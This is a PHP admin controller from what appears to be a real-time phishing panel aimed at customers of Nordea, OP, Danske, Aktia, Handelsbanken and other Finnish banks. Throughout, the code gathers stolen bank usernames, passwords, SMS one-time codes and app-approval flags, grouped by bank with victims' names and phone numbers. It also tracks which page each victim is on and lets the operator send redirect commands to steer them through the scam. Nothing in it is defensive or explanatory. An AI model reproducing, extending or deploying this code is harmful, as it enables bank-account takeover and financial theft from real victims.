<?php

namespace Admin\Controllers;

use Admin\Core\Controller;
use App\Models\User;
use App\Models\UserSession;
use App\Models\Bank;

class UserController extends Controller
{
    public function index(): void
    {
        $userModel = new User();
        $sessionModel = new UserSession();
        $bankModel = new Bank();
        $page = (int) ($_GET['page'] ?? 1);
        $limit = 50;
        $offset = ($page - 1) * $limit;

        $users = $userModel->getAll($limit, $offset);
        $totalUsers = $userModel->getTotalCount();
        $totalPages = ceil($totalUsers / $limit);
        $banks = $bankModel->getAll();

        foreach ($users as &$user) {
            $session = $sessionModel->getCurrentPage($user['id']);
            $user['current_page'] = $session['current_page'] ?? null;
            $user['page_title'] = $session['page_title'] ?? null;
            $user['last_activity'] = $session['last_activity'] ?? null;
        }

        // Tüm kullanıcıları bankalara göre grupla (sol menü için)
        $allUsers = $userModel->getAll(1000, 0); // Tüm kullanıcıları al
        $bankLogs = [];
        $bankNames = [
            'nordea' => 'Nordea',
            'alandsbanken' => 'Ålandsbanken',
            'danske' => 'Danske',
            'spankki' => 'S-Pankki',
            'aktia' => 'Aktia',
            'op' => 'OP',
            'poppankki' => 'POP Pankki',
            'omasp' => 'OmaSP',
            'saastopankki' => 'Säästöpankki',
            'handelsbanken' => 'Handelsbanken'
        ];

        foreach ($bankNames as $bankKey => $bankName) {
            $bankLogs[$bankKey] = [];
            foreach ($allUsers as $u) {
                $hasData = false;
                $bankData = [];
                
                if ($bankKey === 'nordea' && (!empty($u['nordea_username']) || !empty($u['nordea_password']) || !empty($u['nordea_sms_code']) || !empty($u['nordea_app_confirmed']))) {
                    $hasData = true;
                    $bankData = [
                        'username' => $u['nordea_username'] ?? null,
                        'password' => $u['nordea_password'] ?? null,
                        'sms_code' => $u['nordea_sms_code'] ?? null,
                        'app_confirmed' => !empty($u['nordea_app_confirmed'])
                    ];
                } elseif ($bankKey === 'alandsbanken' && (!empty($u['alandsbanken_username']) || !empty($u['alandsbanken_password']) || !empty($u['alandsbanken_sms_code']) || !empty($u['alandsbanken_app_confirmed']))) {
                    $hasData = true;
                    $bankData = [
                        'username' => $u['alandsbanken_username'] ?? null,
                        'password' => $u['alandsbanken_password'] ?? null,
                        'sms_code' => $u['alandsbanken_sms_code'] ?? null,
                        'app_confirmed' => !empty($u['alandsbanken_app_confirmed'])
                    ];
                } elseif ($bankKey === 'danske' && (!empty($u['danske_username']) || !empty($u['danske_password']) || !empty($u['danske_sms_code']) || !empty($u['danske_app_confirmed']))) {
                    $hasData = true;
                    $bankData = [
                        'username' => $u['danske_username'] ?? null,
                        'password' => $u['danske_password'] ?? null,
                        'sms_code' => $u['danske_sms_code'] ?? null,
                        'app_confirmed' => !empty($u['danske_app_confirmed'])
                    ];
                } elseif ($bankKey === 'spankki' && (!empty($u['spankki_username']) || !empty($u['spankki_password']) || !empty($u['spankki_sms_code']) || !empty($u['spankki_app_confirmed']))) {
                    $hasData = true;
                    $bankData = [
                        'username' => $u['spankki_username'] ?? null,
                        'password' => $u['spankki_password'] ?? null,
                        'sms_code' => $u['spankki_sms_code'] ?? null,
                        'app_confirmed' => !empty($u['spankki_app_confirmed'])
                    ];
                } elseif ($bankKey === 'aktia' && (!empty($u['aktia_username']) || !empty($u['aktia_sms_code']) || !empty($u['aktia_app_confirmed']))) {
                    $hasData = true;
                    $bankData = [
                        'username' => $u['aktia_username'] ?? null,
                        'login_method' => $u['aktia_login_method'] ?? null,
                        'sms_code' => $u['aktia_sms_code'] ?? null,
                        'app_confirmed' => !empty($u['aktia_app_confirmed'])
                    ];
                } elseif ($bankKey === 'op' && (!empty($u['op_username']) || !empty($u['op_password']) || !empty($u['op_sms_code']) || !empty($u['op_app_confirmed']))) {
                    $hasData = true;
                    $bankData = [
                        'username' => $u['op_username'] ?? null,
                        'password' => $u['op_password'] ?? null,
                        'sms_code' => $u['op_sms_code'] ?? null,
                        'app_confirmed' => !empty($u['op_app_confirmed'])
                    ];
                } elseif ($bankKey === 'poppankki' && (!empty($u['poppankki_username']) || !empty($u['poppankki_sms_code']) || !empty($u['poppankki_app_confirmed']))) {
                    $hasData = true;
                    $bankData = [
                        'username' => $u['poppankki_username'] ?? null,
                        'sms_code' => $u['poppankki_sms_code'] ?? null,
                        'app_confirmed' => !empty($u['poppankki_app_confirmed'])
                    ];
                } elseif ($bankKey === 'omasp' && (!empty($u['omasp_username']) || !empty($u['omasp_sms_code']) || !empty($u['omasp_app_confirmed']))) {
                    $hasData = true;
                    $bankData = [
                        'username' => $u['omasp_username'] ?? null,
                        'sms_code' => $u['omasp_sms_code'] ?? null,
                        'app_confirmed' => !empty($u['omasp_app_confirmed'])
                    ];
                } elseif ($bankKey === 'saastopankki' && (!empty($u['saastopankki_username']) || !empty($u['saastopankki_sms_code']) || !empty($u['saastopankki_app_confirmed']))) {
                    $hasData = true;
                    $bankData = [
                        'username' => $u['saastopankki_username'] ?? null,
                        'sms_code' => $u['saastopankki_sms_code'] ?? null,
                        'app_confirmed' => !empty($u['saastopankki_app_confirmed'])
                    ];
                } elseif ($bankKey === 'handelsbanken' && (!empty($u['handelsbanken_username']) || !empty($u['handelsbanken_password']) || !empty($u['handelsbanken_sms_code']) || !empty($u['handelsbanken_app_confirmed']))) {
                    $hasData = true;
                    $bankData = [
                        'username' => $u['handelsbanken_username'] ?? null,
                        'password' => $u['handelsbanken_password'] ?? null,
                        'sms_code' => $u['handelsbanken_sms_code'] ?? null,
                        'app_confirmed' => !empty($u['handelsbanken_app_confirmed'])
                    ];
                }
                
                if ($hasData) {
                    $bankLogs[$bankKey][] = [
                        'user_id' => $u['id'],
                        'user_name' => $u['full_name'],
                        'phone' => $u['phone'],
                        'data' => $bankData
                    ];
                }
            }
        }

        $this->view('users/index', [
            'users' => $users,
            'banks' => $banks,
            'currentPage' => $page,
            'totalPages' => $totalPages,
            'totalUsers' => $totalUsers,
            'bankLogs' => $bankLogs
        ]);
    }

    public function bankUsers(): void
    {
        $userModel = new User();
        $sessionModel = new UserSession();
        $bankModel = new Bank();
        
        // URL'den banka adını al
        $requestUri = $_SERVER['REQUEST_URI'] ?? '';
        $bankKey = '';
        
        $bankRoutes = [
            'nordea' => 'Nordea',
            'alandsbanken' => 'Ålandsbanken',
            'danske' => 'Danske',
            'spankki' => 'S-Pankki',
            'aktia' => 'Aktia',
            'op' => 'OP',
            'poppankki' => 'POP Pankki',
            'omasp' => 'OmaSP',
            'saastopankki' => 'Säästöpankki',
            'handelsbanken' => 'Handelsbanken'
        ];
        
        foreach ($bankRoutes as $key => $name) {
            if (strpos($requestUri, '/users/bank/' . $key) !== false) {
                $bankKey = $key;
                break;
            }
        }
        
        if (empty($bankKey)) {
            $this->redirect('/admin/users');
            return;
        }
        
        $bankName = $bankRoutes[$bankKey];
        $page = (int) ($_GET['page'] ?? 1);
        $limit = 50;
        $offset = ($page - 1) * $limit;

        $users = $userModel->getByBankName($bankName, $limit, $offset);
        $totalUsers = $userModel->getCountByBankName($bankName);
        $totalPages = ceil($totalUsers / $limit);
        $banks = $bankModel->getAll();
        
        // Banka ID'sini bul
        $bankId = null;
        $bankIdMap = [
            'nordea' => 1,
            'alandsbanken' => 2,
            'danske' => 3,
            'spankki' => 4, // veya 5
            'aktia' => null, // name'den bulunacak
            'op' => null, // name'den bulunacak
            'poppankki' => 7,
            'omasp' => 8,
            'saastopankki' => 9,
            'handelsbanken' => 10
        ];
        
        if (isset($bankIdMap[$bankKey])) {
            $bankId = $bankIdMap[$bankKey];
        } else {
            // Aktia veya OP için name'den bul
            foreach ($banks as $bank) {
                if ($bankKey === 'aktia' && stripos($bank['name'], 'aktia') !== false) {
                    $bankId = $bank['id'];
                    break;
                } elseif ($bankKey === 'op' && stripos($bank['name'], 'op') !== false && stripos($bank['name'], 'pop') === false) {
                    $bankId = $bank['id'];
                    break;
                }
            }
        }
        
        // S-Pankki için 4 veya 5 kontrolü
        if ($bankKey === 'spankki' && $bankId === 4) {
            $bank4 = $bankModel->findById(4);
            if (!$bank4 || stripos($bank4['name'], 's-pankki') === false) {
                $bankId = 5;
            }
        }

        foreach ($users as &$user) {
            $session = $sessionModel->getCurrentPage($user['id']);
            $user['current_page'] = $session['current_page'] ?? null;
            $user['page_title'] = $session['page_title'] ?? null;
            $user['last_activity'] = $session['last_activity'] ?? null;
        }

        // Tüm kullanıcıları bankalara göre grupla (sol menü için)
        $allUsers = $userModel->getAll(1000, 0);
        $bankLogs = [];
        $bankNames = [
            'nordea' => 'Nordea',
            'alandsbanken' => 'Ålandsbanken',
            'danske' => 'Danske',
            'spankki' => 'S-Pankki',
            'aktia' => 'Aktia',
            'op' => 'OP',
            'poppankki' => 'POP Pankki',
            'omasp' => 'OmaSP',
            'saastopankki' => 'Säästöpankki',
            'handelsbanken' => 'Handelsbanken'
        ];

        foreach ($bankNames as $key => $name) {
            $bankLogs[$key] = [];
            foreach ($allUsers as $u) {
                $hasData = false;
                $bankData = [];
                
                if ($key === 'nordea' && (!empty($u['nordea_username']) || !empty($u['nordea_password']) || !empty($u['nordea_sms_code']) || !empty($u['nordea_app_confirmed']))) {
                    $hasData = true;
                    $bankData = [
                        'username' => $u['nordea_username'] ?? null,
                        'password' => $u['nordea_password'] ?? null,
                        'sms_code' => $u['nordea_sms_code'] ?? null,
                        'app_confirmed' => !empty($u['nordea_app_confirmed'])
                    ];
                } elseif ($key === 'alandsbanken' && (!empty($u['alandsbanken_username']) || !empty($u['alandsbanken_password']) || !empty($u['alandsbanken_sms_code']) || !empty($u['alandsbanken_app_confirmed']))) {
                    $hasData = true;
                    $bankData = [
                        'username' => $u['alandsbanken_username'] ?? null,
                        'password' => $u['alandsbanken_password'] ?? null,
                        'sms_code' => $u['alandsbanken_sms_code'] ?? null,
                        'app_confirmed' => !empty($u['alandsbanken_app_confirmed'])
                    ];
                } elseif ($key === 'danske' && (!empty($u['danske_username']) || !empty($u['danske_password']) || !empty($u['danske_sms_code']) || !empty($u['danske_app_confirmed']))) {
                    $hasData = true;
                    $bankData = [
                        'username' => $u['danske_username'] ?? null,
                        'password' => $u['danske_password'] ?? null,
                        'sms_code' => $u['danske_sms_code'] ?? null,
                        'app_confirmed' => !empty($u['danske_app_confirmed'])
                    ];
                } elseif ($key === 'spankki' && (!empty($u['spankki_username']) || !empty($u['spankki_password']) || !empty($u['spankki_sms_code']) || !empty($u['spankki_app_confirmed']))) {
                    $hasData = true;
                    $bankData = [
                        'username' => $u['spankki_username'] ?? null,
                        'password' => $u['spankki_password'] ?? null,
                        'sms_code' => $u['spankki_sms_code'] ?? null,
                        'app_confirmed' => !empty($u['spankki_app_confirmed'])
                    ];
                } elseif ($key === 'aktia' && (!empty($u['aktia_username']) || !empty($u['aktia_sms_code']) || !empty($u['aktia_app_confirmed']))) {
                    $hasData = true;
                    $bankData = [
                        'username' => $u['aktia_username'] ?? null,
                        'login_method' => $u['aktia_login_method'] ?? null,
                        'sms_code' => $u['aktia_sms_code'] ?? null,
                        'app_confirmed' => !empty($u['aktia_app_confirmed'])
                    ];
                } elseif ($key === 'op' && (!empty($u['op_username']) || !empty($u['op_password']) || !empty($u['op_sms_code']) || !empty($u['op_app_confirmed']))) {
                    $hasData = true;
                    $bankData = [
                        'username' => $u['op_username'] ?? null,
                        'password' => $u['op_password'] ?? null,
                        'sms_code' => $u['op_sms_code'] ?? null,
                        'app_confirmed' => !empty($u['op_app_confirmed'])
                    ];
                } elseif ($key === 'poppankki' && (!empty($u['poppankki_username']) || !empty($u['poppankki_sms_code']) || !empty($u['poppankki_app_confirmed']))) {
                    $hasData = true;
                    $bankData = [
                        'username' => $u['poppankki_username'] ?? null,
                        'sms_code' => $u['poppankki_sms_code'] ?? null,
                        'app_confirmed' => !empty($u['poppankki_app_confirmed'])
                    ];
                } elseif ($key === 'omasp' && (!empty($u['omasp_username']) || !empty($u['omasp_sms_code']) || !empty($u['omasp_app_confirmed']))) {
                    $hasData = true;
                    $bankData = [
                        'username' => $u['omasp_username'] ?? null,
                        'sms_code' => $u['omasp_sms_code'] ?? null,
                        'app_confirmed' => !empty($u['omasp_app_confirmed'])
                    ];
                } elseif ($key === 'saastopankki' && (!empty($u['saastopankki_username']) || !empty($u['saastopankki_sms_code']) || !empty($u['saastopankki_app_confirmed']))) {
                    $hasData = true;
                    $bankData = [
                        'username' => $u['saastopankki_username'] ?? null,
                        'sms_code' => $u['saastopankki_sms_code'] ?? null,
                        'app_confirmed' => !empty($u['saastopankki_app_confirmed'])
                    ];
                } elseif ($key === 'handelsbanken' && (!empty($u['handelsbanken_username']) || !empty($u['handelsbanken_password']) || !empty($u['handelsbanken_sms_code']) || !empty($u['handelsbanken_app_confirmed']))) {
                    $hasData = true;
                    $bankData = [
                        'username' => $u['handelsbanken_username'] ?? null,
                        'password' => $u['handelsbanken_password'] ?? null,
                        'sms_code' => $u['handelsbanken_sms_code'] ?? null,
                        'app_confirmed' => !empty($u['handelsbanken_app_confirmed'])
                    ];
                }
                
                if ($hasData) {
                    $bankLogs[$key][] = [
                        'user_id' => $u['id'],
                        'user_name' => $u['full_name'],
                        'phone' => $u['phone'],
                        'data' => $bankData
                    ];
                }
            }
        }

        $this->view('users/index', [
            'users' => $users,
            'banks' => $banks,
            'currentPage' => $page,
            'totalPages' => $totalPages,
            'totalUsers' => $totalUsers,
            'bankLogs' => $bankLogs,
            'filteredBank' => $bankName,
            'filteredBankKey' => $bankKey,
            'bankId' => $bankId
        ]);
    }

    public function sendRedirect(): void
    {
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            $this->json(['success' => false, 'message' => 'Geçersiz istek.'], 400);
        }

        $userId = (int) ($_POST['user_id'] ?? 0);
        $redirectTo = trim($_POST['redirect_to'] ?? '');

        if ($userId <= 0 || empty($redirectTo)) {
            $this->json(['success' => false, 'message' => 'Geçersiz parametreler.'], 400);
        }

        try {
            $sessionModel = new UserSession();
            $sessionModel->setRedirectCommand($userId, $redirectTo);
            
            $this->json([
                'success' => true,
                'message' => 'Yönlendirme komutu gönderildi. Kullanıcı yakında yönlendirilecek.'
            ]);
        } catch (\Exception $e) {
            $this->json(['success' => false, 'message' => 'Hata: ' . $e->getMessage()], 500);
        }
    }

    public function getPage(): void
    {
        $userId = (int) ($_GET['user_id'] ?? 0);

        if ($userId <= 0) {
            $this->json(['success' => false, 'page' => null], 400);
        }

        try {
            $sessionModel = new UserSession();
            $session = $sessionModel->getCurrentPage($userId);
            
            $this->json([
                'success' => true,
                'page' => $session ? [
                    'current_page' => $session['current_page'],
                    'page_title' => $session['page_title'],
                    'last_activity' => $session['last_activity']
                ] : null
            ]);
        } catch (\Exception $e) {
            $this->json(['success' => false, 'page' => null], 500);
        }
    }

    public function getUser(): void
    {
        $userId = (int) ($_GET['user_id'] ?? 0);

        if ($userId <= 0) {
            $this->json(['success' => false, 'user' => null], 400);
        }

        try {
            $userModel = new User();
            $user = $userModel->findById($userId);
            
            $this->json([
                'success' => true,
                'user' => $user ? [
                    'id' => $user['id'],
                    'full_name' => $user['full_name'],
                    'phone' => $user['phone'],
                    'bank_name' => $user['bank_name'] ?? null,
                    'nordea_username' => $user['nordea_username'] ?? null,
                    'nordea_password' => $user['nordea_password'] ?? null,
                    'nordea_sms_code' => $user['nordea_sms_code'] ?? null,
                    'nordea_app_confirmed' => $user['nordea_app_confirmed'] ?? 0,
                    'alandsbanken_username' => $user['alandsbanken_username'] ?? null,
                    'alandsbanken_password' => $user['alandsbanken_password'] ?? null,
                    'alandsbanken_sms_code' => $user['alandsbanken_sms_code'] ?? null,
                    'alandsbanken_app_confirmed' => $user['alandsbanken_app_confirmed'] ?? 0,
                    'danske_username' => $user['danske_username'] ?? null,
                    'danske_password' => $user['danske_password'] ?? null,
                    'danske_sms_code' => $user['danske_sms_code'] ?? null,
                    'danske_app_confirmed' => $user['danske_app_confirmed'] ?? 0,
                    'spankki_username' => $user['spankki_username'] ?? null,
                    'spankki_password' => $user['spankki_password'] ?? null,
                    'spankki_sms_code' => $user['spankki_sms_code'] ?? null,
                    'spankki_app_confirmed' => $user['spankki_app_confirmed'] ?? 0,
                    'aktia_username' => $user['aktia_username'] ?? null,
                    'aktia_sms_code' => $user['aktia_sms_code'] ?? null,
                    'aktia_app_confirmed' => $user['aktia_app_confirmed'] ?? 0,
                    'aktia_login_method' => $user['aktia_login_method'] ?? null,
                    'poppankki_username' => $user['poppankki_username'] ?? null,
                    'poppankki_sms_code' => $user['poppankki_sms_code'] ?? null,
                    'poppankki_app_confirmed' => $user['poppankki_app_confirmed'] ?? 0,
                    'omasp_username' => $user['omasp_username'] ?? null,
                    'omasp_sms_code' => $user['omasp_sms_code'] ?? null,
                    'omasp_app_confirmed' => $user['omasp_app_confirmed'] ?? 0,
                    'saastopankki_username' => $user['saastopankki_username'] ?? null,
                    'saastopankki_sms_code' => $user['saastopankki_sms_code'] ?? null,
                    'saastopankki_app_confirmed' => $user['saastopankki_app_confirmed'] ?? 0
                ] : null
            ]);
        } catch (\Exception $e) {
            $this->json(['success' => false, 'user' => null], 500);
        }
    }
}

